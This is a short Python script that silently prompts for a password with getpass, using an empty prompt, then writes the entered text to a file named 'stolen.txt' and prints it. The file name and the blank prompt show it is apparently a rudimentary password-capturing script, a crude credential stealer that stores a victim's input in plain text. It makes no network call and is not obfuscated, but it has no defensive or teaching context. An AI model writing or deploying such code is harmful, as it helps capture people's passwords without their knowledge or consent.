#! /bin/python3

import getpass

pw = getpass.getpass("")

with open("stolen.txt", 'w') as f:
	if len(pw) > 0:
		f.write(pw)

print (pw)

